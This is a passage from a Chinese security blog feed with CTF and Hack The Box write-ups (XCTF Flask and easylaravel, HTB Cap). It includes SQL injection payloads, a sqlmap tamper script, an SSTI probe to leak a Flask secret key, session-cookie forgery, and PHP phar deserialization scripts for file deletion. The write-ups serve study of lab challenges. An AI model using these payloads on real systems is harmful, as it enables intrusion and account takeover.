    <updated>2024-09-27T09:30:01.389Z</updated>
    
    <content type="html"><![CDATA[<p>打开页面，还是登录注册，随便注册一个账号，并扫描一下路径。登录之后发现所有信息都放在这里：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240925165730881.png" alt="image-20240925165730881"></p><p>考虑一下有没有注入，发现username和mail都没有，抓包cookie里发现jwt：<img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240925170029704.png" alt="image-20240925170029704"></p><p>&#x3D;&#x3D;》</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240925170128637.png" alt="image-20240925170128637"></p><p>在 <code>jwt.io</code> 中生成的 JWT 使用的是特定的算法（如 HMAC SHA256），并且可以设置特定的密钥和有效载荷。Flask 的 <code>session</code> 默认使用 Flask 内部的签名机制，可能不会以 JWT 格式生成，具体实现可能与 JWT 的结构和内容不同。因此直接使用 <code>jwt.io</code>一般无法直接生成session</p><p>源码也没有发现东西，路径扫描得到<code>/flag</code>路径，访问：</p><blockquote><p>if session[‘isadmin’]: return flag </p></blockquote><p>需要session设置<code>isadmin</code>，那现在需要找到secretkey，因为是flask，应该要通过ssti找config，但是username和mail也不能ssti，测试一下注册页面有无注入，发现注册页面的mail可以sql：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240926150529877.png" alt="image-20240926150529877"></p><p>因为没有回显位置，只能试试bool注入：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240926160826045.png" alt="image-20240926160826045"></p><p>使用payload</p><pre><code>water3@666.com&#39; AND &#39;c&#39;&gt;&#39;b&#39; AND &#39;ckJV&#39;=&#39;ckJV</code></pre><p>此时返回已经注册：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240926165652896.png" alt="image-20240926165652896"></p><p>使用payload</p><pre><code>water3@666.com&#39; AND &#39;a&#39;&gt;&#39;b&#39; AND &#39;ckJV&#39;=&#39;ckJV</code></pre><p>返回注册成功：<img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240926165804748.png" alt="image-20240926165804748"></p><p>后台逻辑应该是判断数据库中是否有相同的名字或者邮件，如果有（<code>true</code>）则返回已经注册，否则可以进入一下步判定，因此每次发包使用固定的<code>mail＋payload</code>，然后使用不同的<code>username</code>,这里需要写一个tamper使用sqlmap：</p><p>tamper.py(参照官方wp，由于新版本不支持urllib.quote()，需要从urllib.parse导入:</p><pre><code>import reimport stringimport randomfrom urllib.parse import quotefrom lib.core.data import kbfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef dependencies():    passdef tamper(payload, **kwargs):    headers = kwargs.get(&quot;headers&quot;,&#123;&#125;)    headers[&quot;Content-type&quot;] = &quot;application/x-www-form-urlencoded&quot;    ran_str = &#39;&#39;.join(random.sample(string.ascii_letters + string.digits, 12))    raw_data = &quot;username=&#123;&#125;&amp;passwd=aiyo&amp;mail=&quot;    new_payload = quote(&#39;aiyo@qq.com&#39;+payload)    return raw_data.format(ran_str) + new_payload</code></pre><p>在 sqlmap 的 <code>tamper</code> 脚本目录中需要有一个空的 <code>__init__.py</code> 文件以便 Python 将该目录识别为一个包，从而允许从该目录导入脚本。然后就可以使用sqlmap了：</p><pre><code> sqlmap -r target.txt --tamper ~/work/sqlmap/tamper.py --technique=B --skip-urlencode --string &#39;Already Registered&#39; -D SQLite -T users -C username --dump --proxy=&quot;http://127.0.0.1:8080&quot;</code></pre><p>这里，代理到bp以便学习一下payload，他这里用<code>&#39;ckJV&#39;=&#39;ckJV</code>作为结尾闭合自动添加在末尾的<code>&#39;</code>，学到了。</p><p><code>--string</code>指定代表注入成功的字符串，在tamper中我们已经编码了payload防止sqlmap双重编码，因此<code>--skip-urlencode</code></p><p>最后注入的到用户名<code>admin</code>和密码<code>h4ck4fun </code></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240926173424634.png" alt="image-20240926173424634"></p><p>此时发现多了一个邮箱修改功能：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240927104659788.png" alt="image-20240927104659788"></p><p>由于邮箱会显示在主页，我们考虑应该在这里有ssti：<code>&#123;2*3&#125;</code></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240927105125365.png" alt="image-20240927105125365"></p><p>ssti学完之后手工做的不多，这里忘得差不多了，想不起来怎么找继承链（本来也不太会），这里使用<code>&#123;user.__class__.__init__.__globals__[current_app].config&#125;</code></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240927105738898.png" alt="image-20240927105738898"></p><p>得到secret key：<code>d327b7e36b7845956bf8db4de198437a</code></p><p>此时借助工具<a href="https://github.com/noraj/flask-session-cookie-manager">GitHub - noraj&#x2F;flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder&#x2F;Encoder</a>可以制作一个cookie-session去访问&#x2F;flag：</p><pre><code>./flask_session_cookie_manager3.py encode -s &#39;&#123;secret_key&#125;&#39; -t &quot;&#123;&#39;isadmin&#39;: 1, &#39;user&#39;: (1, &#39;admin&#39;, &#39;water3@666.com&#39;)&#125;&quot;</code></pre><p>使用生成的cookie访问即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开页面，还是登录注册，随便注册一个账号，并扫描一下路径。登录之后发现所有信息都放在这里：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-202</summary>
      
    
    
    
    
    <category term="xctf" scheme="https://taninluv.github.io/tags/xctf/"/>
    
    <category term="ssti" scheme="https://taninluv.github.io/tags/ssti/"/>
    
    <category term="sqlmap" scheme="https://taninluv.github.io/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>XCTF_easylaravel</title>
    <link href="https://taninluv.github.io/2024/09/18/XCTF-easylaravel/"/>
    <id>https://taninluv.github.io/2024/09/18/XCTF-easylaravel/</id>
    <published>2024-09-18T02:26:38.000Z</published>
    <updated>2024-09-25T08:33:29.679Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF-easylaravel"><a href="#XCTF-easylaravel" class="headerlink" title="XCTF_easylaravel"></a>XCTF_easylaravel</h1><p>首先关于Laravel：<a href="https://laravel.com/docs/5.4/passwords">重置密码 - Laravel 5.4 - Web Artisans 的 PHP 框架</a></p><p>先登录网站，登录注册什么的功能都有，扫描目录的时候看一下网页代码，发现是个代码审计题：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322842.png" alt="image-20240919173106932"></p><p>后续路径扫描找到了一个upload，但是没什么用上不去。</p><p>下载源码看一下，发现有<code>composer.json</code>，于是<code>composer install</code>一下</p><p>看一下路由：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322843.png" alt="image-20240920144548472"></p><p>发现有一个flag路由，跟进一下</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322844.png" alt="image-20240920144659024"></p><p>发现使用了中间件，一个是要身份验证，还有一个应该是要管理员身份才能拿到flag，那看一下中间件怎么控制的。</p><p>没直接找到名字为admin的中间件，在<code>Kernel.php</code>看一下注册的名字关联：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322845.png" alt="image-20240921102453222"></p><p>查看这个中间件代码,发现需要账户的邮箱为指定的管理员邮箱：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322846.png" alt="image-20240921102536398"></p><p>看一下用户注册的代码<code>RegisterController.php</code>,邮箱无法重复使用：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322848.png" alt="image-20240921103133065"></p><p>看一下密码重置：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322849.png" alt="image-20240921103358206"></p><p>使用的是原生的重置方法，去官方文档看一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322850.png" alt="image-20240921105803513"></p><p>如果配置了密码重置自定义过程会配置代理，看一下有没有代理，全局搜索发现有<code>easy_laravel-master\vendor\laravel\framework\src\Illuminate\Auth\Passwords\PasswordBroker.php</code>：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322851.png" alt="image-20240921110901655"></p><p>发送重置连接会创建一个token，根据官方文档，提供了储存token的数据库：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322852.png" alt="image-20240921111104470"></p><p>&#x3D;&#x3D;》</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322853.png" alt="image-20240921111146391"></p><p>得到了表名和列名，需要找一下有无sql注入，网页比较少我们只看了flag的控制器，看一下剩下的：（这里其实普通用户登录后只有一个note界面也能联想到看note的控制器和渲染页面）</p><p>发先note里真有sql：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322854.png" alt="image-20240921111419255"></p><p>注入点是<code>username</code>,先用order判断列数为5，再看回显位置为第2列</p><p>根据之前的发现，需要先去点一下发送链接等系统创建token，接着注入</p><p><code>water3&#39; union select 1,(select token from password_resets where email=&#39;admin@qvq.im&#39;),3,4,5--</code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322855.png" alt="image-20240921112242050"></p><p>拿token去修改密码登录admin</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322856.png" alt="image-20240921112414932"></p><p>flag为空，这里我看源码没有问题但是不知道为什么不显示，看到upload知道应该要做文件上传，但是这里依然很疑惑</p><p>先看下文件上传控制器：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322857.png" alt="image-20240921112849500"></p><p>这里设置文件后缀的检测，并且给了文件存储位置，但是访问不了，好像无法利用？再看下框架：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322858.png" alt="image-20240921121600020"></p><p>搜索一下相关漏洞，有一个<code>CVE-2021-3129</code>,但是需要<code>Ignition</code>组件，这里并没有安装这个组件。</p><p>到这里实在没什么办法了，去看一下其他师傅的做法</p><p><a href="https://venenof.com/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF-easy-laravel-Writeup/">护网杯-easy laravel-Writeup | venenof7’s blog</a></p><p><a href="https://cloud.tencent.com/developer/article/1367783">护网杯easy laravel ——Web菜鸡的详细复盘学习-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><a href="https://xz.aliyun.com/t/2912?time__1311=n4+xni0=i=DtitEYGNDQTPiKG=kWq7Ieqw5Qx">护网杯2018 easy_laravel writeup与记录 - 先知社区 (aliyun.com)</a></p><p>得知了无法显示flag的原因：</p><blockquote><p>直接访问会发现页面提示 <code>no flag</code>，这里页面内容不一致，在 laravel 中，模板文件是存放在 <code>resources/views</code> 中的，然后会被编译放到 <code>storage/framework/views</code> 中，而编译后的文件存在过期的判断。</p><p>在 <code>Illuminate/View/Compilers/Compiler.php</code> 中可以看到</p><pre><code>/** * Determine if the view at the given path is expired. * * @param  string  $path * @return bool */public function isExpired($path)&#123;    $compiled = $this-&gt;getCompiledPath($path);    // If the compiled file doesn&#39;t exist we will indicate that the view is expired    // so that it can be re-compiled. Else, we will verify the last modification    // of the views is less than the modification times of the compiled views.    if (! $this-&gt;files-&gt;exists($compiled)) &#123;        return true;    &#125;    $lastModified = $this-&gt;files-&gt;lastModified($path);    return $lastModified &gt;= $this-&gt;files-&gt;lastModified($compiled);&#125;而过期时间是依据文件的最后修改时间来判断的，所以判断服务器上编译后的文件最后修改时间大于原本模板文件，那么怎么去删除(修改)编译后的文件?</code></pre></blockquote><p>大概就是说Laravel的模版缓存没有更新，我们要进去把他删除掉让他重新渲染出有flag的页面。</p><p>这里的漏洞是是 <code>file_exists</code> 中的参数完全可控，所以可以使用 <code>phar://</code> 协议来触发一次反序列化操作，先了解一下phar:&#x2F;&#x2F;</p><p>在之前只知道这是个php伪协议，由于用得不多所以掌握得不是很好</p><p><a href="https://blog.csdn.net/abc18964814133/article/details/124664538">文件包含之——phar伪协议_phar协议-CSDN博客</a></p><blockquote><p>phar:&#x2F;&#x2F;伪协议<br>这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压，用法：?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php 注意 PHP&gt;&#x3D;5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。</p><p>……..</p><p>总结<br>phar:&#x2F;&#x2F;伪协议<br>这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压，用法：?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php 注意 PHP&gt;&#x3D;5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。步骤：写一个一句话木马shell。php，然后用zip协议解压缩为shell.zip。然后将后缀改为png等其他格式<br>————————————————</p><pre><code>                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</code></pre><p>原文链接：<a href="https://blog.csdn.net/abc18964814133/article/details/124664538">https://blog.csdn.net/abc18964814133/article/details/124664538</a></p></blockquote><p>反序列化删除文件，那么需要先找一个能删除文件的方法,并且包含在魔法函数中：</p><p><a href="https://blog.csdn.net/Klaus_S/article/details/131439581">PHP 删除文件、文件夹方式-CSDN博客</a></p><p>主要是unlink()和rmdir()两个函数,先全局搜索一下unink(:</p><p>最终发现有一个析构函数中包含了unlink:<code>Swift_ByteStream_TemporaryFileByteStream</code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322859.png" alt="image-20240921130237424"></p><p>&#x3D;&#x3D;&gt;</p><pre><code>&lt;?php/** This file is part of SwiftMailer.* (c) 2004-2009 Chris Corbyn** For the full copyright and license information, please view the LICENSE* file that was distributed with this source code.*//** * @author Romain-Geissler */class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream&#123;    public function __construct()    &#123;        $filePath = tempnam(sys_get_temp_dir(), &#39;FileByteStream&#39;);        if ($filePath === false) &#123;            throw new Swift_IoException(&#39;Failed to retrieve temporary file name.&#39;);        &#125;        parent::__construct($filePath, true);    &#125;    public function getContent()    &#123;        if (($content = file_get_contents($this-&gt;getPath())) === false) &#123;            throw new Swift_IoException(&#39;Failed to get temporary file content.&#39;);        &#125;        return $content;    &#125;    public function __destruct()    &#123;        if (file_exists($this-&gt;getPath())) &#123;            @unlink($this-&gt;getPath());        &#125;    &#125;&#125;</code></pre><p>最后结尾部分，描述得最清楚得是这个：</p><p><a href="https://blog.csdn.net/Tel_milk/article/details/127979878">18年护网杯 Easy Laravel Writeup_writeup 模板-CSDN博客</a></p><p>由于对于反序列化不是很了解，这里大概有两种payload：</p><p>一种是<a href="https://cloud.tencent.com/developer/article/1367783">护网杯easy laravel ——Web菜鸡的详细复盘学习-腾讯云开发者社区-腾讯云 (tencent.com)</a>：</p><pre><code>//完整脚本 &lt;?php     include(&#39;autoload.php&#39;);     $a = serialize(new Swift_ByteStream_TemporaryFileByteStream());     $a = preg_replace(&#39;/C:.*tmp/&#39;, &quot;/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;, $a);     $a = str_replace(&#39;s:45&#39;, &#39;s:90&#39;, $a);     var_dump(unserialize($a));     $b = unserialize($a);     $p = new Phar(&#39;./exp.phar&#39;, 0);     $p-&gt;startBuffering();     $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);     $p-&gt;setMetadata($b);     $p-&gt;addFromString(&#39;test.txt&#39;,&#39;text&#39;);     $p-&gt;stopBuffering(); ?&gt;构造post参数调用phar://协议读源码可以找到上传路径/storage/app/public//app\Http\Controllers\UploadController.php class UploadController extends Controller &#123;     public function __construct()     &#123;         $this-&gt;middleware([&#39;auth&#39;, &#39;admin&#39;]);         $this-&gt;path = storage_path(&#39;app/public&#39;);     &#125;又因为nginx是默认配置所以完整路径是/usr/share/nginx/html/storage/app/publiccheck时抓包会发现只有file参数不过源码里面可以看见其实还隐含了path参数//\app\Http\Controllers\UploadController.php $path = $request-&gt;input(&#39;path&#39;, $this-&gt;path);         $filename = $request-&gt;input(&#39;filename&#39;, null);         if($filename)&#123;             if(!file_exists($path . $filename))&#123;加入path参数拼接直接使用phar伪协议访问了exp.gif</code></pre><p>属于是手动替换原始反序列化的参数</p><p>另一种<a href="https://blog.csdn.net/Tel_milk/article/details/127979878">18年护网杯 Easy Laravel Writeup_writeup 模板-CSDN博客</a></p><pre><code>&lt;?phpabstract class Swift_ByteStream_AbstractFilterableInputStream&#123;    /**     * Write sequence.     */    protected $_sequence = 0;     /**     * StreamFilters.     *     * @var Swift_StreamFilter[]     */    private $_filters = array();     /**     * A buffer for writing.     */    private $_writeBuffer = &#39;&#39;;     /**     * Bound streams.     *     * @var Swift_InputByteStream[]     */    private $_mirrors = array(); &#125; class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream&#123;    /** The internal pointer offset */    private $_offset = 0;     /** The path to the file */    private $_path;     /** The mode this file is opened in for writing */    private $_mode;     /** A lazy-loaded resource handle for reading the file */    private $_reader;     /** A lazy-loaded resource handle for writing the file */    private $_writer;     /** If magic_quotes_runtime is on, this will be true */    private $_quotes = false;     /** If stream is seekable true/false, or null if not known */    private $_seekable = null;     public function __construct($path, $writable = false) &#123;        $this-&gt;_path = $path;        $this-&gt;_mode = $writable ? &#39;w+b&#39; : &#39;rb&#39;;         if (function_exists(&#39;get_magic_quotes_runtime&#39;) &amp;&amp; @get_magic_quotes_runtime() == 1) &#123;            $this-&gt;_quotes = true;        &#125;    &#125;     /**     * Get the complete path to the file.     *     * @return string     */    public function getPath()    &#123;        return $this-&gt;_path;    &#125; &#125; class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream&#123;    public function __construct()    &#123;        $filePath = &quot;/var/www/html/storage/framework/views/73eb5933be1eb2293500f4a74b45284fd453f0bb.php&quot;;         parent::__construct($filePath, true);    &#125;    public function __destruct()    &#123;        if (file_exists($this-&gt;getPath())) &#123;            @unlink($this-&gt;getPath());        &#125;    &#125;&#125;  $obj = new Swift_ByteStream_TemporaryFileByteStream();$p = new Phar(&#39;./1.phar&#39;, 0);$p-&gt;startBuffering();$p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);$p-&gt;setMetadata($obj);$p-&gt;addFromString(&#39;1.txt&#39;,&#39;text&#39;);$p-&gt;stopBuffering();?&gt;</code></pre><p>直接使用继承，个人更推荐后一种，防止手动计算链子的时候出错。</p><p>上岸之后直接放飞自我了，现在开始工作了又继续学习渗透，目前属于是卡住了不知道怎么提升，一个是手生了之前写的都觉得陌生，一个是对于接下来学什么没有明确的方向感，打算先在空余时间学习一下靶场里的困难题，学习一下各种思路什么的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XCTF-easylaravel&quot;&gt;&lt;a href=&quot;#XCTF-easylaravel&quot; class=&quot;headerlink&quot; title=&quot;XCTF_easylaravel&quot;&gt;&lt;/a&gt;XCTF_easylaravel&lt;/h1&gt;&lt;p&gt;首先关于Laravel：&lt;a</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="laravel" scheme="https://taninluv.github.io/tags/laravel/"/>
    
    <category term="blade" scheme="https://taninluv.github.io/tags/blade/"/>
    
    <category term="xctf" scheme="https://taninluv.github.io/tags/xctf/"/>
    
    <category term="pop chainr" scheme="https://taninluv.github.io/tags/pop-chainr/"/>
    
  </entry>
  
  <entry>
    <title>HTB_Cap</title>
    <link href="https://taninluv.github.io/2024/08/29/HTB_Cap/"/>
    <id>https://taninluv.github.io/2024/08/29/HTB_Cap/</id>
    <published>2024-08-29T06:41:39.000Z</published>
    <updated>2024-10-26T08:34:04.444Z</updated>
    
    <content type="html"><![CDATA[<p>Hack the box walkthrough</p><span id="more"></span><h1 id="Cap"><a href="#Cap" class="headerlink" title="Cap"></a>Cap</h1><p>扫描：</p><blockquote><p>└─# nmap -sC -sV 10.10.10.245<br>Starting Nmap 7.94SVN ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2024-08-28 23:01 EDT<br>Nmap scan report for 10.10.10.245<br>Host is up (1.4s latency).<br>Not shown: 997 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>21&#x2F;tcp open  ftp     vsftpd 3.0.3<br>22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)<br>|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)<br>|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)<br>80&#x2F;tcp open  http    gunicorn<br>|_http-server-header: gunicorn<br>|<em>http-title: Security Dashboard<br>| fingerprint-strings:<br>|   FourOhFourRequest:<br>|     HTTP&#x2F;1.0 404 NOT FOUND<br>|     Server: gunicorn<br>|     Date: Thu, 29 Aug 2024 02:52:06 GMT<br>|     Connection: close<br>|     Content-Type: text&#x2F;html; charset&#x3D;utf-8<br>|     Content-Length: 232<br>|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><br>|     <title>404 Not Found</title><br>|     <h1>Not Found</h1><br>|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p><br>|   GetRequest:<br>|     HTTP&#x2F;1.0 200 OK<br>|     Server: gunicorn<br>|     Date: Thu, 29 Aug 2024 02:51:51 GMT<br>|     Connection: close<br>|     Content-Type: text&#x2F;html; charset&#x3D;utf-8<br>|     Content-Length: 19386<br>|     <!DOCTYPE html><br>|     <html class="no-js" lang="en"><br>|     <head><br>|     <meta charset="utf-8"><br>|     <meta http-equiv="x-ua-compatible" content="ie=edge"><br>|     <title>Security Dashboard</title><br>|     <meta name="viewport" content="width=device-width, initial-scale=1"><br>|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico"><br>|     <link rel="stylesheet" href="/static/css/bootstrap.min.css"><br>|     <link rel="stylesheet" href="/static/css/font-awesome.min.css"><br>|     <link rel="stylesheet" href="/static/css/themify-icons.css"><br>|     <link rel="stylesheet" href="/static/css/metisMenu.css"><br>|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css"><br>|     <link rel="stylesheet" href="/static/css/slicknav.min.css"><br>|     &lt;!– amchar<br>|   HTTPOptions:<br>|     HTTP&#x2F;1.0 200 OK<br>|     Server: gunicorn<br>|     Date: Thu, 29 Aug 2024 02:51:52 GMT<br>|     Connection: close<br>|     Content-Type: text&#x2F;html; charset&#x3D;utf-8<br>|     Allow: OPTIONS, GET, HEAD<br>|     Content-Length: 0<br>|   RTSPRequest:<br>|     HTTP&#x2F;1.1 400 Bad Request<br>|     Connection: close<br>|     Content-Type: text&#x2F;html<br>|     Content-Length: 196<br>|     <html><br>|     <head><br>|     <title>Bad Request</title><br>|     </head><br>|     <body><br>|     <h1><p>Bad Request</p></h1><br>|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP&#x2F;1.0&amp;#x27;&amp;#x27;<br>|     </body><br>|</em>    </html><br>1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br>SF-Port80-TCP:V&#x3D;7.94SVN%I&#x3D;7%D&#x3D;8&#x2F;28%Time&#x3D;66CFE491%P&#x3D;x86_64-pc-linux-gnu%r(G<br>SF:etRequest,1574,”HTTP&#x2F;1.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:<br>SF:x20Thu,\x2029\x20Aug\x202024\x2002:51:51\x20GMT\r\nConnection:\x20close<br>SF:\r\nContent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:\x20<br>SF:19386\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class&#x3D;&quot;no-js&quot;\x20lang&#x3D;&quot;en<br>SF:”&gt;\n\n<head>\n\x20\x20\x20\x20&lt;meta\x20charset&#x3D;&quot;utf-8&quot;&gt;\n\x20\x20\x20<br>SF:\x20&lt;meta\x20http-equiv&#x3D;&quot;x-ua-compatible&quot;\x20content&#x3D;&quot;ie&#x3D;edge&quot;&gt;\n\x<br>SF:20\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20&lt;me<br>SF:ta\x20name&#x3D;&quot;viewport&quot;\x20content&#x3D;&quot;width&#x3D;device-width,\x20initial-sca<br>SF:le&#x3D;1&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel&#x3D;&quot;shortcut\x20icon&quot;\x20type&#x3D;&quot;im<br>SF:age&#x2F;png&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;images&#x2F;icon&#x2F;favicon.ico&quot;&gt;\n\x20\x20\x20\x<br>SF:20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;bootstrap.min.css<br>SF:&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;<br>SF:font-awesome.min.css&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;<br>SF:x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;themify-icons.css&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20r<br>SF:el&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;metisMenu.css&quot;&gt;\n\x20\x20\x20<br>SF:\x20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;owl.carousel.mi<br>SF:n.css&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;stati<br>SF:c&#x2F;css&#x2F;slicknav.min.css&quot;&gt;\n\x20\x20\x20\x20&lt;!–\x20amchar”)%r(HTTPOpt<br>SF:ions,B3,”HTTP&#x2F;1.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Thu,<br>SF:\x2029\x20Aug\x202024\x2002:51:52\x20GMT\r\nConnection:\x20close\r\nCon<br>SF:tent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nAllow:\x20OPTIONS,\x20GET,<br>SF:\x20HEAD\r\nContent-Length:\x200\r\n\r\n”)%r(RTSPRequest,121,”HTTP&#x2F;1.1<br>SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20t<br>SF:ext&#x2F;html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20<br>SF:x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<bodSF:y>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inv<br>SF:alid\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;R<br>SF:TSP&#x2F;1.0&amp;#x27;&amp;#x27;\n\x20\x20</body>\n</html>\n”)%r(FourOhFourRequest,<br>SF:189,”HTTP&#x2F;1.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x<br>SF:20Thu,\x2029\x20Aug\x202024\x2002:52:06\x20GMT\r\nConnection:\x20close<br>SF:r\nContent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:\x202<br>SF:32\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20&quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD\x20HTML\x203.2<br>SF:x20Final&#x2F;&#x2F;EN&quot;&gt;\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found&lt;&#x2F;<br>SF:h1&gt;\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20<br>SF:server.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x2<br>SF:0check\x20your\x20spelling\x20and\x20try\x20again.</p>\n”);<br>Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p><p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 266.91 seconds</p></blockquote><p>看一下web：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202410261633887.png" alt="image-20240829145204826"></p><p> 点击安全快照跳转到一个操作面板，可以下载pcap文件，剩下两个按钮可以查看网络状态，但是好像都没什么用</p><p>到处抓包试一下，发现下载按钮的id很明显：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202410261633889.png" alt="image-20240829145514553"></p><p>写个简单的脚本挨着下载一下</p><blockquote><p><strong>for</strong> i <strong>in</strong> <strong>{<strong>0..500</strong>}</strong>; <strong>do</strong>   wget 10.10.10.245&#x2F;download&#x2F;<strong>${<strong>i</strong>}</strong> -O 